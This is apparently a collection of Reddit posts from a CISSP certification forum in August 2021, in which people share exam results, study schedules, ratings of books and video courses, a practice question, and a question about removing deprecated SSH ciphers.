I also had a copy of OSG 7th edition which I read through over the course of a few months. Highlight through it so you can go back and review it. After finishing the boot camp and completing the book, I went back through my highlighted notes leading up to the exam.

I signed up for CCCure test engine that has 2000+ questions for CISSP. I suggest either doing the same or something similar. Go through questions as much as possible. I probably went through those questions several times, answering 4000+ questions. I started going from low 70% results at 20 questions and doing better and better until I was getting about 90% for 150 questions. Questions aren't the same by any means but the topics similar and really helps you think through the questions and answers.

This past weekend, I took Kelly H's. boot camp on Cybrary over 3 days, about 6 hours/day. The material felt a little dated but still helpful.

Last recommendation is watch ""Why you'll pass the CISSP"" by Kelly H and ""CISSP Exam 2020 Exam Tips"" by Larry Greenblatt on Youtube. Both of them provide a lot of information on how to think through the exam. The exam is technical but you are not support to answer the questions from a technical view point but as a risk advisor.

In regards to actual studying on a daily basis, I'd study a few hours each day to continue momentum. I'm a father of 2 who loves to spend time with my family. Even though the exam was difficult, it was very passible.

Good luck and reach out if you have questions! Always happy to chat and help.",2021-08-12

Edit: Thank you all for the kind comments. I was finally able to make the one thing that kept me sane into a full time career.

632,p2apwi,Passed CISSP exam in first attempt,"Hi All,

I am happy to inform that I have passed my CISSP exam in first attempt on 26th July’21 and I am happy to share my study plan.

Before reading further, my suggestion to people is that once you have decided to give CISSP exam then don’t stretch your study plan. Once you decide, start preparing and register for the exam and crack it. Once you have decided, nothing can stop you.

And yes, don’t register for the exam unless you want to sacrifice your sleep, social life, social media, web series, movies, and some amount of family time as well. (this is just small list I can recall now). But yes, in the end all efforts are worth it when you get that congratulation print out!!

Thankfully, with school-going kids and my husband also preparing for his certification exam, I got a full study environment at home. 

**Suggestion while preparing for Exam** 

Make notes of important point, preferably handwritten. It will help you to understand better.

I started my preparation in Jan (it was my new year resolution). I followed the below timetable, and the timings were like 

1) Jan to Apr – 5 hours daily (4:30 AM – 8:00 AM & 9:00 PM -10:30 PM)

2) April to May – 1-2 hours daily, as I was quite distracted due to covid situation around and unable to focus

3) June – 5 hours (5:00 AM – 8:30 AM & 9:00 PM -10:30 PM)

4) July – First three weeks – 6 hours (4:30-8:30 and then 8:30 PM – 10:30 PM) and weekends full day.

5) Last 4 days before the exam – Almost 14-16 hours/daily starting from 2:30 AM, till the time my mind gives up. Had to stretch a lot

**I have studied from below listed books –** 

1. CISSP Certified Information Systems Security Professional Official Study Guide 8th edition - Read it once (skipped chapter which I was very familiar like Risk, BCP, DRP, Asset, etc) – 8/10

2. Kelly Handerhon course at Cybrary, Although it doesn’t cover the full syllabus, concepts explained well – 9/10

3. Sari Greene course at O'Reilly – 27 hours plus, it's good for second understanding. In my case, exam pattern changed May onwards, and I studied old book, so I went through Sari Greene video as the content was updated with the latest syllabus– 10/10

4. Adom Gorden Question of the day at LinkedIn – I finished all questions in just 4 days. Go through the explanation also – 10/10

5. Thor Peterson training and question set at Udemy. It’s good for revision 8/10

6. Prabh Nair youtube videos – His all youtube videos are too good. Just go for all CISSP videos it's good especially SDN, SAML, COTS, etc 10/10

7. Eric Conrad’s CISSP Study Guide 11th Hour – Reviewed only last chapter 7/10

8. Mike Chapple videos on LinkedIn learning – His videos are excellent, especially for domain 4, to understand network concepts in a much better way – 8/10

**Last week before the exam –** 

9. Review all your handwritten notes

10. Luke Ahmed book – How to think like Manager – 7/10

11. Review Prashant Mohan Memory Palace second last day before exam – 10/10

12. CISSP Mind Map by Rob Witcher on youtube – His videos are super helpful; I watched his video for the second time last day before the exam. If possible, I would rate as 11/10 :D

I Solved \~3,000+ questions and still felt unprepared.

**Exam day -** 

Although it's recommended to sleep for 8 hours and I would suggest the same, but I could hardly sleep for 3 hours in the night due to the exam stress and I woke up at 1:45 AM, revised my handwritten notes. Just before leaving for exam, I again watched Kelly’s Video on **why you will pass the CISSP exam** and the Test-taking strategy slide from Sari Greene's 27 hours video to ensure you have a good mindset. 

I reached the examination centre at 7:30 AM. 

I was little confused for the first few questions and wasn’t sure if I was reading the questions correct. I relaxed, did some breathing exercises, and focussed on the test.  Although I was initially stressed but after 40-50 questions, I started gaining confidence and after around 80 questions I started feeling that I would pass the exam. 

CAT format can play psychological games as the questions vary in difficulty based on your previous answers and If you are able to respond one question easily, next question will be super tough. I was able to understand the questions and even if I was 100% sure with the answer, I used the elimination technique.

Finally, trust yourself, trust your preparations, be positive, read the question, re-read the question, select the answer based on the elimination process (just to be double sure, as this exam is CAT and you don’t have the option to go back and change response later), only then click on next. And once you get the printout you will forget all your struggle and celebrate. 

I tried my best to pen down all the things. Feel free to ping me in case you required any additional information. All the best for your preparations",2021-08-11

635,p24uqd,Passed at 100 questions today,"I think the things that helped me the most

1. Consistent study plan over several months. One hour per day during work week.
2. Boson practice exams. Worth the 90 bucks. Definitely the most similar practice questions to the exam.
3. Larry greenblatt on YouTube. He is a little hippy dippy but give him atleast 40 minutes of your time before you move on. His mindset helps you choose the best answer when you narrow it down to two or three answers.
4. Luke ahmed “think like a manager” book. This helps you understand that you should always prioritize policies, thinking before you act, and risk management. Again, helps pick the best answer.
5. Read the questions twice, atleast! I passed at 100 questions at exactly two hours. There were two questions where i was like “ok no clue move on”. But for the others, especially the ones that seems way too easy, read it again! There are almost always two answers that are right. Ask yourself - which is more specific? Is one answer too generic that now the scope is huge and you would waste money? 
6. Wear contacts. My glasses fogged so bad and it was distracting because of covid.
7. Be prepared for some noise distractions and don’t let it ruin your exam. The person next to me cleared their throat every 30 seconds and I was so angry. I broke the marker. Took a deep breath. And told myself to never give up. And then I went back to it.
8. This is a technical exam! You should know how the technologies work. Study what you don’t know and do a deep dive. Worst case scenario you understand a security topic like PKI really well and you use it in your job 3 years from now.

I’m glad I passed. I honestly don’t know if I would have had the strength to keep studying and retake. For those of you that keep failing and keep trying - you are strong. Keep pursuing what is meaningful to you and don’t let anything ruin your relationships and whatever else is important to you.",2021-08-11

637,p209gl,Passed using only free military resources,"So first up, I passed today at 100 questions in 80 minutes.  And I spent the first 10-15 minutes writing down a bunch of information to warm up (a bit of a mindset trick I picked up from taking the PMP). I think I referenced it maybe once and that was only to verify the steps within the RMF. Honestly, the questions were so easy they were hard. I could make the case for any usually 2-3 and the “think like the manager” was a bit at odds with some of the practice questions I had. So it was a toss up to choose an easy technical control or report the situation up through the process for someone else to figure out. 
  
Anyways, I passed. So what I wanted to do here is provide some **free** resources to all the people in the military (guard/reserve/active) that are thinking about pursuing a CISSP. I paid $0 out of pocket for this cert and you can too.

* [O’Reilly Media.]( https://www.oreilly.com/online-learning/government.html) I had to email their customer service to get them to activate a free license for me, and that took about 7 days. Gives access to lots of free ebooks and some test, to include Sybex’s official book and practice tests.
* [Wiley.]( https://www.efficientlearning.com/) Used the free ebook from O’Reilly and registed to use Wiley’s practice engine. This is where I spent most of my time.
* [Army Ignited.]( https://www.armyignited.com/app/) Love it or hate it, this is here to stay. You will have a $4000 pool every year to use on certifications or regular Tuition Assistance. I am simplifying, but if you fail you have to pay the voucher fee back. Instead, you can enroll in a training course and get a “certification of completion” to say you have completed the course (but it just so happens to also include a voucher). And if you fail the real CISSP exam, you still pay nothing back. I did this route. I didn’t do any of the videos, just printed out the cert.  For more info about it or why, see [here]( https://www.cool.osd.mil/army/costs_and_funding/army_ca_faq.htm).
  
And there you have it--a somewhat easy guide to use for CISSP or really any certification. Also 2 other free resources I used were [Destination certification,]( https://www.youtube.com/c/DestinationCertification/playlists) which provided a decent overview/review (though I wouldn't use it for much beyond that). And Isc2’s [Glossary,]( https://www.isc2.org/Certifications/CISSP/CISSP-Student-Glossary) to just ensure you are operating with the same language.",2021-08-10

641,p1at9r,Passed CISSP exam first try with ~5 months of study,"Hey everybody,

So I've been holding off to make this post until I had received my [official pass results](https://imgur.com/bkZZkEx) and sent in my application for endorsement.  Since I sent off my application the other day, I figured it was time to share my story.  This is going to be a long one, so I'll break it up into sections so you can read what you want.

    My Exam Experience

I wanted to start with this section as I feel it's the most important.  I took my exam at a professional Pearson testing center, about 2 hours away from my home.  My exam was on a Thursday, so I took that week off of work and reviewed every day from the moment I got up to the moment I went to bed.  I would wake up, chug some coffee, get to work, and sip on GFUEL all day to keep focused.  The day of my exam, I slept in, went for a walk, went out to IHOP for breakfast, and then drove to the testing center where I was an hour early so I could find the room where the exam was and then review in my car for a bit.  Going into the exam, I did not feel prepared, or that I knew all the information needed... but I have a rule about sticking to my exam date otherwise I'll keep pushing it back.  I figured if nothing else, I was about to take a REALLY good (and expensive) practice exam.  I honestly could have probably used another month of study to feel more comfortable.

I read some study that people who take adaptive exams generally score higher if they take their time on their first 10 or so questions, so I did that.  My overall strategy was that I would plan for like 110 questions, and then probably fail.  But I wanted to take my time and thoroughly read each question.  I figured my chances of actually going up to 150 were slim.  After the first 20 or so questions, I felt like the exam was focusing on all those little protocols, frameworks, and acronyms that you generally see once in your studies and brush off as not important.  It really drilled down on topics I didn't spend a lot of time on.  I received multiple questions about SOC, and honestly I could not recall the differences at all.  Pretty sure it kept asking them because I kept getting it wrong (be sure that when it was all over, I went and studied SOC).  After about 60 questions, I felt exhausted.  I felt like most of stuff that I studied and focused on memorizing didn't show up at all.  I stressed over memorizing Common Criteria tiers just before going in... not a single question about it.  Memorized SDLC and RMF... nothing about those.  I don't want to go into further detail due to NDA, but yeah.  Overall, around question 80, I was actually getting kind of mad lol.  I felt like 80% of my questions were ""what should you do if this happens"" or ""where would you find this listed"" types of things.  Overall it seems to be less about knowledge you've studied, and more what is best for this certain situation.

I focused hard until I got up to question 100, and before I clicked the button to submit my answer, I prepared myself to have either terribly failed, or totally passed.  I didn't know which.  It seemed like either my overall train of thought was going to be correct, or it wasn't.  After question 100, I had about 40 minutes left.  I kept slogging through each additional question, expecting the exam to end.  I ended up going all the way to 150 questions and ended with just seconds to spare.  I really had to kick up my speed after the initial 100, and I did NOT expect to go to 150, and had planned my slow reading strategy based on that... oh well!  I was exhausted when the exam was over.  I took my folded printout, went to the bathroom, then got in the elevator down to the parking garage.  I opened the printout in the elevator, and saw ""Congratulations!"" on the first line.  I let out the biggest and loudest cheer in my life.  I then had to sit in my car for 20 minutes before driving home just to relax and recover from the exam.

I'd love to be able to tell you ""study this"" and ""don't study this"", but honestly from all my time on here and asking others who have taken the test, it's impossible to say what's important and what's not.  Things I was told were super important didn't show up at all, and things I was told not to focus on popped up several times.  For the first day after I passed my exam, I was actually a bit angry because I felt like I spent so many nights focusing on learning material that didn't show up at all on the exam... but I realized that they can only quiz you on so many topics with such few questions.  So I must have shown early on that I knew certain related things, and diving deeper would be pointless.

    My Previous Experience

I have my Bachelor of Science in Computer Information Technology, but I wouldn't say this was much help aside from test-taking experience/strategy.  I achieved my CCNA last year, which made Domain 4 a breeze.  I got my Security+ in January, which I think was a good stepping stone into CISSP as it covered a lot of initial topics... Basically everything you learn in Sec+ is utilized in CISSP, so I don't see a downside to taking it first.  In February and March I took the AZ-900 and AI-900 exams since I got free vouchers from Microsoft's cloud skills challenges, so that helped me introduction to cloud topics (which is about as deep as CISSP goes).

I've also been working as a ""Server & Network Administrator"", leading the Network & Security team and Helpdesk team.  I've been working here for a little over 5 years, since I was hired on to an empty team right out of college, and learned everything on my own as I went.  It's been a long journey of having to just ""figure it out"" since I didn't have a mentor or someone who could teach me.  Just lots of google, troubleshooting techniques, trial & error, and tackling problems as they came along.  My job responsibilities include creating and managing Windows servers, SAN devices, a lot of old undocumented proprietary software, automation through powershell & command prompt scripting, data backups, SQL database management, IIS, active directory, DHCP, DNS, and network device (routers, switches, etc), PCI DSS audits, etc.  Basically a jack of all trades, master of none.

Originally I was going to go down the Networking route, but for these past couple years, I've been on a daily call with our parent company's Security team, and one of them mentioned having previously worked in Networking, but moving to Security as the market was in higher demand and the pay scale was higher, which perked up my ears.  I mostly sit quietly on the call and wait for something about our office or users to be mentioned, but being able to listen to them talk smart guy stuff and go over the SIEM and other cool software has been a huge motivator.  Then they recommended I go for CISSP.

Luckily, my job responsibilities have included things such as PCI DSS and ISO audits, and generating policies and procedures (Domain 1), data encryption and access controls (Domain 2), vulnerability scanning, patching vulnerabilities, establishing virtual & physical servers, and public server cryptography (Domain 3), network device configuration and hardening as well as port security (Domain 4), active directory and user security rights management (Domain 5), and (*unfortunately*) incident response and log management (Domain 7).  Thus, while I haven't worked specifically in security, I have had a little bit of experience across a lot of things... which I thought kind of fits perfectly with the ""mile wide, inch deep"" mentality.  I wouldn't say my experience was very big, but it helped me relate certain topics to work.

    My Resources

So... I kind of get nervous when it comes to studying and try to [get every resource](https://imgur.com/utz3mdE) I can find.  Which is a bit overkill, but at least I can see what sticks with me.  Admittedly, I'm more of a visual learning than a textbook reader.

**Thor Teaches on Udemy**    
This was my main resource, and where I gained the most knowledge.  I would load up these videos whenever I could focus and stare at the screen.  I even picked up a Microsoft Wireless Display Adapter so I could cast my browser on my Surface to my TV and sit on my couch and listen.  Great content, and his notes were fantastic.  I ended up printing out all his PDF notes and putting them in sheet protectors in a binder.  The only thing that sucked is that by grouping the lessons into two-domain courses, some courses (like the one that includes D3 & D4) end up being much higher value than the ones that focus on smaller domains.  Still, I'd highly recommend the series.  9/10

**Certification Station on Discord**    
This server on Discord was fantastic.  It really kept me motivated, and helped me work through the thought process on various questions.  If you stay active in the channel, you'll end up doing hundreds of practice questions without even thinking about it.  11/10

**MindMap videos by Rob Witcher on YouTube**    
I'm pretty sure I'm responsible for hundreds of plays on these videos.  These videos became my main audio source while walking or driving to work, and I'd even listen to them as I went to sleep.  It's a great way to refresh important topics as well as quickly go over a chapter before diving into it with a main resource.  And they're free.  Not enough deep info to learn everything, but just about the perfect  review resource.  You're crazy if you don't utilize these.  10/10

**CISSP Cert Prep (2021) by Mike Chapple on LinkedIn Learning**    
Some people like Mike Chapple's teaching method, and some don't.  But his updated LinkedIn Learning videos are very well produced, and include chapter quizzes to make sure you're taking in information rather than just zoning out.  It was another source I used primarily for audio, or for getting another perspective on a confusing topic from Thor's videos.  I do think it sometimes focused on less important things and glanced over big topics, but that may be because the course is designed to go along with the Official Study Guide textbook.  7/10

**Kelly Handerhan's CISSP course on Cybrary**    
Kelly is very passionate about what she teaches, which helps keep you motivated, but this video series really lightly glosses over the information.  It can serve as a good review or refresher, but shouldn't be your main video source.  However, it's free, so still nice.  5/10

**Adam Gordon's notes**    
So everyone on Certification Station knows of Adam's notes, which are freely available on the Discord server.  They've been formatted into a nice format by some users in the server that have made reading a lot easier.  I'm not sure if his ITPro.TV course offers something nicer, but I'd say the only thing these notes lack is looking nice and organized.  Otherwise, they are FULL of information and tricks to help remember certain things.  I'd highly recommend reading through these at least once.  8/10

**ISC2 CISSP Official Study Guide (2018)**    
Honestly, I didn't use this much.  I tried to read through it, but I felt it really dragged on through certain topics.  There's no reason Domain 2 should get as many pages as it does.  After reading through a few chapters, this became more of a reference book.  I'm sure it would be great for those that can read through it in full, but I couldn't do it.  6?/10

**CISSP Study Guide (3rd Edition) by Eric Conrad**    
I picked this book up because it was shorter than the OSG.  Where the OSG wanted 140 pages for something, this book covered it in 60.  Most of the reading I did came out of this book.  I highly preferred the condensed design, but the book was certainly showing its age.  This ""latest"" edition is from 2016, and could do with some updates.  6/10

**CISSP For Dummies (6th Edition)**    
I felt this book was great!  I don't see it recommended here enough.  It's from 2018, so reasonably updated.  I didn't read it through fully, but I could see it being a very competent primary reading source.  I used it mostly for reference to double-check things that didn't make sense in my video studies, or practice questions that confused me.  The only thing really lacking in this book is that the site for redeeming the online practice exams is defunct, so you have to call their support line to get an activation code on their new site.  Not a huge issue as I didn't really use their practice questions, but a noticeable issue.  It's also still smaller than the OSG.  7/10

**11th Hour CISSP by Eric Conrad**    
This book was just ok.  I bought both the physical and Audible versions.  Some people said they used it as a review after going over everything, but I think it's too light for that.  I think it would do well as an introduction book when you're first starting your studies and want to dip your toes into each domain first over the course of 200 pages.  Nothing to really learn much info from, but a good way to understand the general topics you'll be diving into.  5/10

**The Effective CISSP by Wentz Wu**    
This book is designed to be a focus on Domain 1 and 2, with a touch of 3.  For the most part, it does that.  I was expecting it to go into further detail than what I had already learned, but that wasn't really the case.  If you've paid attention in your primary study source, this will mostly just repeat what you've already learned, but that can be nice if it's been a while since you went over these topics.  It does give a good description between various steps and such.  Is the book necessary?  Not really... but if you want to hammer in these particular domains, it's a nice addition if you have time.  7/10

**How To Think Like a Manager by Luke Ahmed**    
I'd definitely recommend this book.  It's cheap, and goes over 25 questions and the thought process you should go through.  Best of all, it goes through a VARIETY of questions you would go through, such as ""pick the best out of a list of potentially correct answers"", ""you can easily eliminate two of these"", ""the actual question is asking you for something that can specifically be answered by only one of these"", etc.  The only issue I had with the book was one question (Q14) that focused on firewall architecture ""tiers"", which is not listed in any textbook, and the only video source I could find was one by Luke, and I still couldn't determine what a ""three-tier 2"" architecture and such were.  I spent a couple hours trying to figure this out, but then all of Certification Station agreed it didn't make any sense, and wouldn't show up in the exam, which it didn't.  8/10

**CISSP Exam Guide Ultimate Edition 2021 by Walter Roberts**    
Look... Stay away from this.  It's useless.  The layout is terrible, it looks like it was typed up in Microsoft Word and printed, it skips over important information, and focuses way too heavily on stupid stuff (we don't need two pages on what Malware is).  When I was going through my CCNA studies, I found a cheap book on Amazon called ""CCNA 200-301 Quick Reference Guide"" that was like $12, and 112 pages.  It included all of the exam objectives with a brief description and notes about each objective, allowing the reader to quickly reference each objective and see if they knew the topic or needed to read more.  I was looking for a cheap book that did something similar... just a quick reference of each topic so I could determine if I've missed something.  This book was not that.  At all.  The only reason it gets any points is because it was cheap.  2/10

    Practice Exams  & Quizzes

I used a ton of practice exams and quiz sources... I used the official ISC2 practice exam book, I used CCCure, I used practice questions from all the textbooks above, I used the new Pocket Prep app (whatever it's called now), Wentz and Adam's Q of the Day, etc.  Certification Station itself is a huge conglomerate of practice questions from various sources, so its hard to tell which one was which.  I wouldn't say I went through thousands of questions like many people here... probably a total of like 500-600.  Like many people here say, the practice exams are not like the real thing.  There may be a question or two that pop in and seem similar, but generally those questions are freebie questions anyways (straight to the point definition-like questions).  What I really aimed to do was identify my weak spots and then study those sections.  For me, the new Pocket Prep app was really useful for this because it gives a readout of your proficiency in each domain so I could see which ones I was lacking, and then go back and review those.

But honestly?  Whatever you're using is probably fine.  Don't be like me and waste a huge amount of time and money trying to find the ""best"" practice exams.  There aren't any, and ISC2 send C&D's to people who create questions too similar to the real thing (like with Wentz).  So you're not going to find perfect practice questions.  Just find something that helps you pinpoint your weak spots, and then review those sections.  The best thing you can do is practice and test your knowledge, so just find something and study.  Try to use a couple resources if you can so you can get a variety.

    In Closing...

The exam was tough.  I'm still surprised I passed, but it's encouraged me to continue my studies.  I wouldn't say I'm wayyy more knowledgeable than I was before I started studying... but that may be because I had a good basepoint.  I certainly learned a few interesting and useful things, and hammered down some stuff that I lightly touched on in other certs.

I plan on taking CISM next since the material is similar.  A lot of people just said to go take a few practice exams and then take the real thing, but I want to read through a bit before taking it, as I still feel like there are some CISSP topics I'm not too familiar with.  After that, I'm hoping to either jump into CySA+ or eJPT... I just feel like I've taken a lot of certifications involving knowledge and procedures, but I still have a huge feeling of Impostor Syndrome, and I don't feel like I have as many practical skills as I'd like.  I was offered a few ""Senior Security Analyst"" positions just minutes after posting that I passed the exam, but I still feel too inexperienced.  So overall I'm trying to find something that can prepare me for a more security-centric job.

Sorry for the novel here... just trying to be thorough.",2021-08-09
642,p18g19,"Failed, 150 Questions","Today I sat for the CISSP exam and failed at 150 questions. I scored Below Proficiency Level on 4 of the domains, and  Near Proficiency Level on the other 4. Looking at how i was graded on the test I wonder how I even made it to 150 questions(I was likely not a few questions away from passing). I mainly studied out of the Cybex book and the practice questions included, the mindmap series on YT and loosely following Kelly Handerhan on Cybrary, as well as help from you all on this subreddit!

It has discouraged me and I'm leaning towards not sitting for a retake.

644,p0gh9k,"Passed, 100q","Been seeing a lot of ""Passed!"" posts so thought I'd throw in my experience.

Just took the exam last night and passed at 100 questions at a little over an hour.

The key takeaway I want to pass on to you if you're studying: ***you can do it!***

Personal history: I'm old enough to have 2 kids in college, been doing IT and security since my career started in 1994, and I was a computer science major.  I've been involved in SOC audits, written security policies, and consulted with lots of companies regarding how to secure IT assets properly, including extensive HIPAA consulting.  Branched out and got EnCE forensic certification in 2014 and have been doing forensics and testimony in civil cases since then in addition to the other consulting.  Lots of other certs as well, including the suite of CompTIA and Microsoft. In a word, I have experience, and I know how to take tests.

I'd thought about getting CISSP starting in about 2010 but had put it out of my mind after seeing the commitment it takes to get it, and the Shon Harris book just sat on my shelf for 10 years afterwards.  Plus, I couldn't justify the cert as bringing anything to my resume that I didn't already have.  A colleague of mine wanted CISSP really bad though, so as a challenge I told him I'd go for it too.  We could study together and push each other along.  

2021 was our year, even with the exam being updated.  He is scheduled to take his in October and I've been encouraging him to study more, but life has a way of telling you that your focus needs to be on other things like family and work.  Same applied to me, but I started just giving myself little 10 or 20 question quizzes in between other obligations, or slipping in a Youtube video or a quick read of a few pages.  Eventually the quizzes worked up into 50 questions, and then I took full on 150 question exams.

Resources that are invaluable:

* RELEVANT EXPERIENCE.  This is passable without experience, but if you have worked even tangentially to security, lean on it.
* TEST TAKING. Practice tests count for a TON and gets you in the mindset.  Don't cheat on them.  If you're struggling, make them smaller, even if it's just 1-5 questions.  Get to where you are comfortable and then work your way up.  Whether you miss a question OR EVEN IF YOU GET IT RIGHT, read the explanation and refer back to the books.  Retake missed questions.
* REDDIT. Read your colleagues' experiences, but also be aware that there are some amazing resources here, including the actual authors of study guides and books, and professional trainers.  They don't hide, and don't be afraid to reach out.
* YOUTUBE.  There's so many free videos out there, and many are wonderful at getting the fundamentals ingrained in your mind.

Things I didn't do:

* Read any book cover-to-cover.  I didn't have time or inclination.
* Keep testing myself on subjects I was already familiar with.  For example, I knew I was strong in forensics, but weak in encryption.  So I focused more on encryption until I got comfortable with it.

Specific tools I used to study:

* BOSON.  I will swear up and down that Boson is what got me through this.  They've updated to the 2021 material.  The explanations for answers are top-notch.  By test day I was scoring 95%-100% on full exams.  The only (\*tiny\*) complaint I have about it is that the online version of the test doesn't let you create a custom exam to skip questions you've already answered X number of times, which the local installation does.
* CISSPREP. I hated this test bank with a passion, because it was so hard.  I never broke about 65% on it.  However, its questions really made me think, and were not just rote memorization answers.  I can definitely see the value in the questions it asks, but that doesn't mean I enjoyed taking them.
* ALL IN ONE CISSP EXAM GUIDE, 5th edition.  This one is a carryover from 2010 but was still really helpful, particularly in how security models came to be.  I'd obviously recommend getting the latest edition, but even the older ones still have merit.
* CISSP CBK 2015.   Also older, but still has merit.  Obviously don't seek out an older CBK, but work with what you have, and if someone gifts you older books or you have something in your personal library, don't throw them out.
* Most of all, /u/benmalisow one of the aforementioned authors and trainers active on /r/cissp, who was extremely generous with his time and helpfulness.

As I said above, ***you can do it!***  

It's challenging, yes.  

It's not the hardest test I've ever taken (EnCE was exponentially harder) but I did stop at some questions and just stare at them for a couple of minutes.  Other questions I answered in about 10 seconds.

A little bit about me:

I'm a  information security Analyst focused in incident response and forensics (2.5 years) with 3.5 Years of additional IT background: 1 year sysadmin, 2.5 years as NOC engineer for an ISP (Strong networking).  Even though my technical background, I'm willing to get out of the weeds and move to a more managerial role so I started passing SSCP and now CISSP. 

Preparation:

Read the book 4 hours per day (leveraging 2 hours saved by remote work) from Monday to Friday and rest the weekend. After book I did the practice exams while identifying my weakness. Re-read /refresh my weak domains with Sunflower and Mindmaps, finally a whole month of just Cissprep.

The Exam:

As everyone says I didn't know if pass or fail until grab the results sheet. The exam was SO HIGH level at some times and too technical in other times (Domain 3-4).

I'm from Dominican Republic, so mi natural language is Spanish (sorry for my English) and that increases the difficulty level for me in the question reading/understanding, at the point of having to read one single question 5 times.

I've provisionally passed the CISSP exam on 1st attempt.

On the ISC2 website, it might take up to 8 weeks... until the official confirmation comes out. Jeez...

150 questions, in 143 mins.

Previously I passed the CISSP Review and holding an Active EC-Council CCISO certificate, so the challenge was NOT so bothersome or struggling, with all due respect to test takers.

The only challenge I had was the size of the bottle which I had to urinate for not leaving the test desk lol... Have you faced a bottle that is almost full and still, you've LOT to go...

Almost ruined the ground and my pant. \^\^

Anyway, that's me guys, any questions or whatever, let me know...

I know that I want to I want to stay in consulting for the next 5-10 years, so I'm trying to plot out which certs would make the most sense, both from a ""resume booster"" perspective and from the perspective of someone who actually wants to have a good foundation in risk and information security.

&#x200B;

With that said, the most applicable credential to what I do now is the CISA, but everything I've heard suggests that it's not that challenging for someone with a strong auditing background. My ultimate goal for the next year or two is to get the CISSP, as this sub and other resources suggests it holds the most weight for someone who wants to get into management. However, I don't have a strong background in IT or good study skills, so I'm thinking that taking the Sec+ and Network+ first would make the most sense; the area I'm unfamiliar with is how much those two relate to the CISA.

So, would it make the most sense to go: Network+ -> Sec+ -> CISA -> CISSP ? Or is there a better route to take? Also very open to suggestions about other credentials, especially ones that seem popular with consultants or the people who hire them.",2021-08-05

661,oxbqfd,Passed my CISSP today,"Hey all,

After an intense 5-day training course and a week of practicing exam questions, I took and passed the CISSP exam. It took me a little over an hour before I got the notification that the test was over. I just wanted to share my experiences for anyone who is planning to take the exam.

As many have already pointed out, the real exam is quite different from the practice exams. That doesn't mean that you'd be wasting your time doing the practice exams though.

In my experience, memorizing the correct answers (from practice exams) will not help you to prepare for the real exam. However, doing the practice exams can help you to read the questions (very) carefully. Sometimes, it takes only one word to completely change the meaning of the question (and subsequently the correct answer to it). When doing practice exams, I noticed that I usually finished them a lot faster than required. This encouraged me to take my time during the real exam.

I found the questions from the real exam to be more varied and less ""gruelling"" than the practice exams. 

One piece of advice I can give you is to really take the time to read and understand the question carefully. You have more than enough time to read it multiple times but once you answer it and move to the next one, you can't go back.

Good luck with your exam!",2021-08-03

669,owdfw6,Fun CISSP Practice Question,"\*\*Admin(s) Please Delete If Not Helpful\*\*

By the end of 1989, the price of ROM chips was dropping enough that Capcom game designers Akira Nishitani and Akira Yasuda began their ambitious plan for Street Fighter 2. Senior management asked the two designers to stay in-line with the original game and keep it straight forward. Management also asked for a quick turnaround to compete with other upcoming game releases such as Midway’s Mortal Kombat.

While the designers wanted to stay within the confines of the original game structure, they also wanted the freedom to try new things during development with the new ROM chips. Their goal was to create a list of skilled and iconic characters each with their own special abilities. For example, the additional memory space allowed the character Guile to have his Low Kick flipped to look like an upside-down air kick. And as Dhalsim’s limbs started getting longer and longer with each development iteration, it could be counter-balanced by making the character move slower. E. Honda’s flying attack and Chun Li’s Spinning Bird Kick were also newly added memory spaces on the ROM boards. These moves pushed the game from realistic to unrealistic, and added to its charm.

48-bits of data were allocated on the game boards to accommodate these changes.

This resulted in characters slowly increasing their assigned memory while in production and sometimes required a quick fix. In order to make these constant changes, Nishitani and Yasuda needed an accelerated development process with the final end-result already defined, but with the flexibility to allow for improvements while prototyping designs, going back and cutting animation frames for memory conservation, and re-examining system motherboard architecture. The designers needed the ability to constantly build, demonstrate, and refine their game animation changes.

Which of the following software development models would best fit this environment?

A. Waterfall method  
B. Rapid Application Development  
C. Joint Application Development  
D. Spiral Model

IMPORTANT \*\*\*\*\*\*\* Try to write your notes in the sequence/way that exam expects from you.. Like Advantages/disadvantages of each thing e.g. RBAC, Access models (Write them in series from Most to Least, Primary and Secondary etc.). It will help you with the exact mindset of the exam...

Reading book is very important..

11th hour

and Adam's Bootcamp noted from Discord

Thor's Udemy course and old question bank

Kelly's Cybrary Course to refresh the knowledge

BOSON and Sybex Official practice test (recommended)

Luke Ahmed's subscription (too much information in the questions, in exam questions are pretty small 2-3 lines max and will clear descriptions)

CISSPrep Question (not same like exam, don't take these question near to exam. If English is not your first language then it will give you some tough time, but it may improve your thinking skill)

&#x200B;

Again, This is my experience, I didn't like the lengthy questions but if it works for you then it is good else don't spend too much time and move on..

&#x200B;

One recommendation, scores of the practice questions is not relevant, I was getting 40%-50% in Luke questions, which was kind of demotivation for me, so I just completed them without looking at the result.

Still, I managed to passed at 100Q, I was still feeling that I am not fully prepared (even after passing the exam :D )... so you will be never prepared the exam....

672,ovu73a,Standard and safe ciphers,"
I am checking some Linux servers and can see ciphers for basically two: SSL and SSH.  For SSH I can see some deprecated ciphers like CBC, MD5, arcfour which needs to be removed. if I categorize ciphers for SSH, then they are 4 types: 1. Kex (diffie-hellman-group-exchange-sha256) 2. Server host key (rsa, dss) 3. Encryption (ctr, aes, chacha20-poly, cbc etc) 4. Mac-algorithms (hmac-sha2-256). 5 Compression (none)
1.	Could there be ciphers for other services else than SSL and SSH too that needs to be checked?
2.	Getting rid of older and deprecated ciphers (like arcfour, md5) are obvious but what about removing kex algorithm (like Diffie Helman), or Chacha20-poly etc?  Is there a standard list of ciphers for Linux servers, something recommended by NIST or else?

674,ovm35i,Failed today at 150 questions,"Welp...i kinda saw that coming. I felt very unprepared the 2 weeks before the exam. The more i crammed, the less i felt like i knew. Practice tests range from 50-68%, which was discouraging. 

I have a bachelor's in business management (2011) and a masters in information technology systems (2020). I work as a research analyst for a small tech company. My everyday job isn't technical or managerial, but i have done some light technical work here and there for the company the past 9 years I've been there. I thought the test was pretty technical. Especially domain 4, my greatest nemesis. 

Started studying beginning of May. I tried to read the shon harris book, but was overwhelmed (only got through 1/2 book) At the end of may, i took a few practice tests and got around 50%. Only studied about 3hrs on a good day, much less or none on busy days. 

June, used the 11th hour to get to know the domains and then go into detail with videos, research, and shon harris book. Started doing practice test questions every other day. Was feeling better in June.... Then life happened. Didn't study for ~3 weeks. I kept thinking i had time left to study in july. 

July comes and things don't cool downwith life stuff. I was thinking of rescheduling but my mom convinced me to keep my date. It will force me to study, which i agreed with. Didn't get any better. Was only able to study everyday for ~3hr. 

Took a week off work before the exam to cram. That was the bulk of my study time, but even on the week of, i studied 5-6hr. 

I think the practice tests i used were representative of the exam. The sybex practice questions were pretty good, especially in how it is worded. The questions were similar, but the answer choices in the actual exam were more tricky.
